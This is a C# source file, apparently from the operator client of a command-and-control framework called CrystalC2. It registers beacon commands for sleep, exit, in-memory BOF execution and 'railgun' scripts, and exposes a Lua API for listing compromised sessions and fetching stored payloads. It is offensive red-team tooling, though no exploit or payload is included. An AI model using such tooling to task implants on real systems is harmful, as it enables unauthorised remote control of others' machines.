using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Avalonia.Threading;
using Client.Payloads;
using Client.Scripts.RailgunScript;
using Client.Services;
using Client.Sessions;
using CrystalC2.Beacons;
using CrystalC2.Tasks;
using Google.Protobuf;
using MoonSharp.Interpreter;

namespace Client.Scripts;

internal sealed class ScriptEngine
{
    private readonly ServerConnection _connection;
    private readonly LinkerApiClient _linker;
    private readonly ConcurrentDictionary<string, CliCommand> _commands;
    private SessionsPanelViewModel? _sessions;
    private PayloadsPanelViewModel? _payloads;

    public delegate Task CliCommandHandler(uint beaconId, string[] args, Action<string>? localOutput, Func<TaskRequest, Task>? sendTask);

    public sealed record CliCommand(CliCommandHandler Handler, string? Description);

    public event EventHandler? CommandsChanged;
    public event Action<uint, string>? BeaconOutput;

    public ScriptEngine(ServerConnection connection, LinkerApiClient linker)
    {
        _connection = connection;
        _linker = linker;
        _commands = new ConcurrentDictionary<string, CliCommand>(StringComparer.OrdinalIgnoreCase);
        RegisterDefaultCommands();
    }

    public void SetSessions(SessionsPanelViewModel sessions) => _sessions = sessions;
    public void SetPayloads(PayloadsPanelViewModel payloads) => _payloads = payloads;

    public IReadOnlyList<string> GetCommandNames() => [.. _commands.Keys.Order()];
    public bool IsCommand(string name) => _commands.ContainsKey(name);

    public string? GetCommandDescription(string name) =>
        _commands.TryGetValue(name, out var cmd) ? cmd.Description : null;

    public void ExecuteCommand(string name, uint beaconId, string[] args, Action<string>? localOutput = null,
        Func<TaskRequest, Task>? sendTask = null)
    {
        if (_commands.TryGetValue(name, out var cmd))
        {
            _ = cmd.Handler(beaconId, args, localOutput, sendTask);
        }
    }

    private void RegisterDefaultCommands()
    {
        _commands["exit"] = new CliCommand(
            (id, _, _, sendTask) =>
            {
                var req = new TaskRequest { BeaconId = id, TaskType = TaskType.Exit, CommandLine = "exit" };
                return sendTask is not null ? sendTask(req) : Task.Run(() => SendTask(req));
            },
            "Terminate the Beacon session");

        _commands["sleep"] = new CliCommand(
            (id, args, _, sendTask) =>
            {
                var secs = args.Length > 0 && int.TryParse(args[0], out var s) ? s : 0;
                var jitter = args.Length > 1 && int.TryParse(args[1], out var j) ? j : 0;
                var req = new TaskRequest
                {
                    BeaconId = id,
                    TaskType = TaskType.Sleep,
                    TaskData = ByteString.CopyFrom(BofPack("ii", Encoding.UTF8, secs, jitter)),
                    CommandLine = $"sleep {secs} {jitter}"
                };
                return sendTask is not null ? sendTask(req) : Task.Run(() => SendTask(req));
            },
            "Set sleep interval and jitter: sleep <seconds> [jitter%]");

        _commands["inline"] = new CliCommand(
            (id, args, localOutput, sendTask) =>
            {
                var bofPath = args.Length > 0 ? args[0] : string.Empty;
                var configSpec = args.Length > 1 && args[1].EndsWith(".spec", StringComparison.OrdinalIgnoreCase)
                    ? args[1]
                    : null;
                var argsStart = configSpec is not null ? 2 : 1;
                var cmdArgs = args.Length > argsStart ? string.Join(" ", args[argsStart..]) : string.Empty;
                var argsBuf = BofPack("z", GetAnsiEncoding(id), cmdArgs);
                SendInlineAsync(id, bofPath, argsBuf, localOutput ?? (_ => { }), sendTask, configSpec);
                return Task.CompletedTask;
            },
            "Execute a BOF: inline </path/to/bof> [args]");

        _commands["railgun"] = new CliCommand(
            (id, args, localOutput, sendTask) =>
            {
                if (args.Length == 0)
                {
                    localOutput?.Invoke("Usage: railgun </path/to/script> [i:int | z:str | Z:wstr | p:payload_name ...]");
                    return Task.CompletedTask;
                }

                string source;
                try { source = File.ReadAllText(args[0]); }
                catch (Exception ex) { localOutput?.Invoke($"[!] {ex.Message}"); return Task.CompletedTask; }

                byte[] compiled;
                var scriptBaseDir = Path.GetDirectoryName(Path.GetFullPath(args[0]));
                try { compiled = CompileRailgunScript(source, GetAnsiEncoding(id), scriptBaseDir); }
                catch (Exception ex) { localOutput?.Invoke($"[!] compile: {ex.Message}"); return Task.CompletedTask; }

                byte[] argsBuf = [];
                if (args.Length > 1)
                {
                    try { argsBuf = PackRailgunArgs(args[1..], GetAnsiEncoding(id), _payloads?.Payloads); }
                    catch (Exception ex) { localOutput?.Invoke($"[!] args: {ex.Message}"); return Task.CompletedTask; }
                }

                var payload = argsBuf.Length > 0 ? [.. compiled, .. argsBuf] : compiled;
                var req = new TaskRequest
                {
                    BeaconId = id,
                    TaskType = TaskType.Railgun,
                    TaskData = ByteString.CopyFrom(payload),
                    CommandLine = $"railgun {Path.GetFileName(args[0])}"
                };
                return sendTask is not null ? sendTask(req) : Task.Run(() => SendTask(req));
            },
            "Execute a railgun script file: railgun </path/to/script> [i:int | z:str | Z:wstr | p:payload_name ...]");

        _commands["help"] = new CliCommand(
            (_, _, output, _) =>
            {
                var ordered = _commands.Keys.Order().ToList();
                var colWidth = ordered.Max(n => n.Length) + 2;
                var lines = ordered.Select(name =>
                {
                    var desc = _commands.TryGetValue(name, out var c) ? c.Description : null;
                    return desc is not null ? $"{name.PadRight(colWidth)}{desc}" : name;
                });
                output?.Invoke(string.Join(Environment.NewLine, lines));
                return Task.CompletedTask;
            },
            "List all available commands");
    }

    public async Task<IReadOnlyList<string>> RunAsync(string code, string scriptPath, Action<string> log, CancellationToken ct)
    {
        var snapshot = await Dispatcher.UIThread.InvokeAsync(() =>
            (_sessions?.Sessions ?? Enumerable.Empty<BeaconSessionViewModel>())
            .Select(s => new SessionSnapshot(
                s.BeaconId, s.Computer, s.UserDisplay, s.Listener,
                s.InternalIp, s.Pid, s.Process, s.ArchDisplay, s.OsDisplay))
            .ToList());

        var scriptDir = Path.GetDirectoryName(scriptPath) ?? AppContext.BaseDirectory;
        var ctx = new ScriptContext();
        var registeredCommands = new List<string>();

        await Task.Run(() =>
        {
            var script = new Script(CoreModules.Preset_HardSandbox);

            script.Globals["print"] = DynValue.NewCallback((_, args) =>
            {
                log(string.Join("\t", args.GetArray().Select(a => a.ToPrintString())));
                return DynValue.Void;
            });

            script.Globals["crystal"] = BuildCrystalTable(script, log, snapshot, ctx, registeredCommands, scriptDir);

            try
            {
                script.DoString(code);
            }
            catch (InterpreterException ex)
            {
                log($"[error] {ex.DecoratedMessage}");
            }
        }, ct);

        return registeredCommands;
    }

    public void UnregisterCommands(IEnumerable<string> names)
    {
        var changed = false;
        foreach (var name in names)
        {
            if (_commands.TryRemove(name, out _))
            {
                changed = true;
            }
        }

        if (changed)
        {
            CommandsChanged?.Invoke(this, EventArgs.Empty);
        }
    }

    private Table BuildCrystalTable(Script script, Action<string> log, IReadOnlyList<SessionSnapshot> snapshot,
        ScriptContext ctx, List<string> registeredCommands, string scriptDir)
    {
        return new Table(script)
        {
            ["log"] = DynValue.NewCallback((_, args) =>
            {
                log(args.Count > 0 ? args[0].ToPrintString() : string.Empty);
                return DynValue.Void;
            }),

            ["print"] = DynValue.NewCallback((_, args) =>
            {
                var id = (uint)args[0].Number;
                var message = args.Count > 1 ? args[1].ToPrintString() : string.Empty;
                BeaconOutput?.Invoke(id, message);
                return DynValue.Void;
            }),

            ["sessions"] = DynValue.NewCallback((_, _) =>
            {
                var t = new Table(script);
                for (var i = 0; i < snapshot.Count; i++)
                {
                    var s = snapshot[i];
                    t[i + 1] = DynValue.NewTable(new Table(script)
                    {
                        ["id"] = s.Id,
                        ["computer"] = s.Computer,
                        ["user"] = s.User,
                        ["listener"] = s.Listener,
                        ["ip"] = s.Ip,
                        ["pid"] = s.Pid,
                        ["process"] = s.Process,
                        ["arch"] = s.Arch,
                        ["os"] = s.Os
                    });
                }

                return DynValue.NewTable(t);
            }),

            ["bof_pack"] = DynValue.NewCallback((_, args) =>
            {
                var beaconId = (uint)args[0].Number;
                var format = args[1].String;
                var ansi = GetAnsiEncoding(beaconId);
                var values = new object[format.Length];
                for (var i = 0; i < format.Length; i++)
                {
                    var arg = args[2 + i];
                    values[i] = format[i] switch
                    {
                        'i' => arg.Type == DataType.Number ? (int)arg.Number : int.Parse(arg.String),
                        's' => arg.Type == DataType.Number ? (short)arg.Number : short.Parse(arg.String),
                        _ => arg.String
                    };
                }

                return DynValue.NewString(Encoding.Latin1.GetString(BofPack(format, ansi, values)));
            }),

            ["barch"] = DynValue.NewCallback((_, args) =>
            {
                var id = (uint)args[0].Number;
                var session = _sessions?.Sessions.FirstOrDefault(s => s.BeaconId == id);

                return session?.Arch switch
                {
                    BeaconArch.X86 => DynValue.NewString("x86"),
                    BeaconArch.X64 => DynValue.NewString("x64"),
                    _ => DynValue.NewString("unknown")
                };
            }),

            ["inline"] = DynValue.NewCallback((_, args) =>
            {
                var id = (uint)args[0].Number;
                var bofPath = args[1].String;

                var argsBuf = args.Count > 2 && args[2].Type == DataType.String
                    ? Encoding.Latin1.GetBytes(args[2].String)
                    : [];

                var configSpec = args.Count > 3 && args[3].Type == DataType.String
                    ? args[3].String
                    : null;

                SendInlineAsync(id, bofPath, argsBuf, log, ctx.SendTask, configSpec);
                return DynValue.Void;
            }),

            ["sleep"] = DynValue.NewCallback((_, args) =>
            {
                var id = (uint)args[0].Number;
                var secs = (int)args[1].Number;
                var jitter = args.Count > 2 ? (int)args[2].Number : 0;
                var req = new TaskRequest
                {
                    BeaconId = id,
                    TaskType = TaskType.Sleep,
                    TaskData = ByteString.CopyFrom(BofPack("ii", Encoding.UTF8, secs, jitter)),
                    CommandLine = $"sleep {secs} {jitter}"
                };
                DispatchTask(ctx.SendTask, req);
                return DynValue.Void;
            }),

            ["exit"] = DynValue.NewCallback((_, args) =>
            {
                var req = new TaskRequest
                {
                    BeaconId = (uint)args[0].Number,
                    TaskType = TaskType.Exit,
                    CommandLine = "exit"
                };
                DispatchTask(ctx.SendTask, req);
                return DynValue.Void;
            }),

            // crystal.railgun(id, source_string [, packed_args_string])
            ["railgun"] = DynValue.NewCallback((_, args) =>
            {
                var id     = (uint)args[0].Number;
                var source = args[1].String;

                byte[] compiled;
                try { compiled = CompileRailgunScript(source, GetAnsiEncoding(id)); }
                catch (Exception ex) { log($"[error] railgun compile: {ex.Message}"); return DynValue.Void; }

                var argsBuf = args.Count > 2 && args[2].Type == DataType.String
                    ? Encoding.Latin1.GetBytes(args[2].String)
                    : Array.Empty<byte>();

                var payload = argsBuf.Length > 0 ? [.. compiled, .. argsBuf] : compiled;
                var req = new TaskRequest
                {
                    BeaconId = id,
                    TaskType = TaskType.Railgun,
                    TaskData = ByteString.CopyFrom(payload),
                    CommandLine = "railgun"
                };
                DispatchTask(ctx.SendTask, req);
                return DynValue.Void;
            }),

            ["get_payload"] = DynValue.NewCallback((_, args) =>
            {
                var name = args[0].String;
                var payload = _payloads?.Payloads.FirstOrDefault(p =>
                    string.Equals(p.Name, name, StringComparison.OrdinalIgnoreCase));

                if (payload is null)
                {
                    return DynValue.Nil;
                }

                return DynValue.NewTable(new Table(script)
                {
                    ["name"] = payload.Name,
                    ["user"] = payload.User,
                    ["note"] = payload.Note is not null ? DynValue.NewString(payload.Note) : DynValue.Nil,
                    ["bytes"] = DynValue.NewString(Encoding.Latin1.GetString(payload.Bytes)),
                    ["yara"] = payload.HasYara ? DynValue.NewString(payload.Yara) : DynValue.Nil
                });
            }),
            
            ["script_resource"] = DynValue.NewCallback((_, args) =>
            {
                var resource = args[0].String;
                var path = Path.Combine(scriptDir, resource);

                return DynValue.NewString(path);
            }),

            ["register_command"] = DynValue.NewCallback((_, args) =>
            {
                var name = args[0].String;
                var description = args.Count > 1 && args[1].Type == DataType.String ? args[1].String : null;
                var fn = args[2];
                var onStatus = args.Count > 3 && args[3].Type == DataType.Function ? args[3] : DynValue.Nil;

                _commands[name] = new CliCommand(Handler, description);
                registeredCommands.Add(name);
                CommandsChanged?.Invoke(this, EventArgs.Empty);
                return DynValue.Void;

                Task Handler(uint beaconId, string[] cmdArgs, Action<string>? _, Func<TaskRequest, Task>? sendTask)
                {
                    var argsTable = new Table(script);
                    for (var i = 0; i < cmdArgs.Length; i++)
                    {
                        argsTable[i + 1] = DynValue.NewString(cmdArgs[i]);
                    }

                    ctx.SendTask = onStatus.Type == DataType.Function
                        ? BuildStatusSendTask(script, onStatus, log, sendTask)
                        : sendTask;

                    try
                    {
                        script.Call(fn, (double)beaconId, DynValue.NewTable(argsTable));
                    }
                    catch (InterpreterException ex)
                    {
                        log($"[error] {ex.DecoratedMessage}");
                    }
                    finally
                    {
                        ctx.SendTask = null;
                    }

                    return Task.CompletedTask;
                }
            }),
        };
    }

    private Action<TaskResponse>? _nextObserver;

    internal Action<TaskResponse>? ConsumeNextObserver() => Interlocked.Exchange(ref _nextObserver, null);

    private Func<TaskRequest, Task> BuildStatusSendTask(Script script, DynValue onStatus, Action<string> log,
        Func<TaskRequest, Task>? originalSendTask)
    {
        return async req =>
        {
            _nextObserver = response =>
            {
                var statusStr = response.Status.ToString();
                var output = response.HasOutput
                    ? DynValue.NewString(Encoding.UTF8.GetString(response.Output.ToByteArray()))
                    : DynValue.Nil;

                var info = new Table(script)
                {
                    ["beacon_id"] = (double)req.BeaconId,
                    ["status"] = statusStr,
                    ["output"] = output
                };
                try
                {
                    script.Call(onStatus, DynValue.NewTable(info));
                }
                catch (InterpreterException ex)
                {
                    log($"[error] {ex.DecoratedMessage}");
                }
            };

            if (originalSendTask is not null)
            {
                await originalSendTask(req);
            }
            else
            {
                SendTask(req);
            }
        };
    }

    private void DispatchTask(Func<TaskRequest, Task>? sendTask, TaskRequest req)
    {
        _ = sendTask is not null ? sendTask(req) : Task.Run(() => SendTask(req));
    }

    internal static byte[] CompileRailgunScript(string source, Encoding ansi, string? baseDir = null)
    {
        var tokens  = new Lexer(source).Tokenize();
        var program = new Parser(tokens).ParseProgram();
        return new Compiler(ansi, baseDir).Compile(program);
    }

    internal static byte[] PackRailgunArgs(
        string[] specs, Encoding ansi,
        IReadOnlyList<PayloadItemViewModel>? payloads = null)
    {
        using var ms = new MemoryStream();
        foreach (var spec in specs)
        {
            var colon = spec.IndexOf(':');
            if (colon < 1)
                throw new Exception($"invalid arg '{spec}': expected type:value (i:42, z:hello, Z:hello, p:payload_name)");
            var type  = spec[..colon];
            var value = spec[(colon + 1)..].Trim('"');
            switch (type)
            {
                case "i":
                    if (!int.TryParse(value, out var intVal))
                        throw new Exception($"not a valid integer: {value}");
                    WriteI32(ms, intVal);
                    break;
                case "z":
                    var zb = ansi.GetBytes(value);
                    WriteI32(ms, zb.Length + 1);
                    ms.Write(zb);
                    ms.WriteByte(0);
                    break;
                case "Z":
                    var wb = Encoding.Unicode.GetBytes(value);
                    WriteI32(ms, wb.Length + 2);
                    ms.Write(wb);
                    ms.WriteByte(0); ms.WriteByte(0);
                    break;
                case "p":
                    if (payloads is null)
                        throw new Exception("payload store is unavailable in this context");
                    var payload = payloads.FirstOrDefault(p =>
                        string.Equals(p.Name, value, StringComparison.OrdinalIgnoreCase))
                        ?? throw new Exception($"payload '{value}' not found in store");
                    WriteI32(ms, payload.Bytes.Length);
                    WriteI32(ms, payload.Bytes.Length);
                    ms.Write(payload.Bytes);
                    break;
                default:
                    throw new Exception($"unknown arg type '{type}': use i, z, Z, or p");
            }
        }
        return ms.ToArray();
    }

    private static byte[] BofPack(string format, Encoding ansi, params object[] values)
    {
        using var ms = new MemoryStream();

        for (var i = 0; i < format.Length; i++)
        {
            switch (format[i])
            {
                case 'b':
                {
                    var bytes = values[i] is byte[] raw ? raw : Encoding.Latin1.GetBytes((string)values[i]);
                    WriteI32(ms, bytes.Length);
                    ms.Write(bytes);
                    break;
                }
                case 'i':
                {
                    WriteI32(ms, (int)values[i]);
                    break;
                }
                case 's':
                {
                    WriteI16(ms, (short)values[i]);
                    break;
                }
                case 'z':
                {
                    var bytes = ansi.GetBytes((string)values[i]);
                    WriteI32(ms, bytes.Length + 1);
                    ms.Write(bytes);
                    ms.WriteByte(0);
                    break;
                }
                case 'Z':
                {
                    var bytes = Encoding.Unicode.GetBytes((string)values[i]);
                    WriteI32(ms, bytes.Length + 2);
                    ms.Write(bytes);
                    ms.WriteByte(0);
                    ms.WriteByte(0);
                    break;
                }
            }
        }

        return ms.ToArray();
    }

    private static void WriteI32(Stream s, int v)
    {
        s.WriteByte((byte)(v >> 24));
        s.WriteByte((byte)(v >> 16));
        s.WriteByte((byte)(v >> 8));
        s.WriteByte((byte)v);
    }

    private static void WriteI16(Stream s, short v)
    {
        s.WriteByte((byte)(v >> 8));
        s.WriteByte((byte)v);
    }

    private Encoding GetAnsiEncoding(uint beaconId)
    {
        var charset = _sessions?.Sessions.FirstOrDefault(s => s.BeaconId == beaconId)?.Charset ?? 0;
        try
        {
            return charset > 0 ? Encoding.GetEncoding(charset) : Encoding.UTF8;
        }
        catch
        {
            return Encoding.UTF8;
        }
    }

    private void SendInlineAsync(uint beaconId, string bofPath, byte[] argsBuf, Action<string> log,
        Func<TaskRequest, Task>? sendTask = null, string? configSpec = null)
    {
        var request = new LinkerRequest
        {
            Action = "link",
            Params = new LinkerParams
            {
                Spec = Path.Combine(AppContext.BaseDirectory, "Beacon", "bof.spec"),
                File = bofPath
            },
            Config = configSpec is not null ? [configSpec] : []
        };

        _ = Task.Run(async () =>
        {
            try
            {
                var result = await _linker.GenerateAsync(request);
                var packed = BofPack("bb", Encoding.UTF8, result.Bytes, argsBuf);
                var req = new TaskRequest
                {
                    BeaconId = beaconId,
                    TaskType = TaskType.Pico,
                    TaskData = ByteString.CopyFrom(packed),
                    CommandLine = $"inline {bofPath}"
                };

                if (sendTask is not null)
                {
                    await sendTask(req);
                }
                else
                {
                    SendTask(req);
                }
            }
            catch (Exception ex)
            {
                log($"[error] {ex.Message}");
            }
        });
    }

    private void SendTask(TaskRequest req)
    {
        _ = Task.Run(async () =>
        {
            var svc = new TaskGrpcService(_connection);
            try
            {
                await svc.StartAsync(_ => { }, CancellationToken.None);
                await svc.SendAsync(req);
                await Task.Delay(500);
            }
            finally
            {
                await svc.DisposeAsync();
            }
        });
    }

    private sealed class ScriptContext
    {
        public Func<TaskRequest, Task>? SendTask { get; set; }
    }

    private sealed record SessionSnapshot(
        double Id,
        string Computer,
        string User,
        string Listener,
        string Ip,
        double Pid,
        string Process,
        string Arch,
        string Os);
}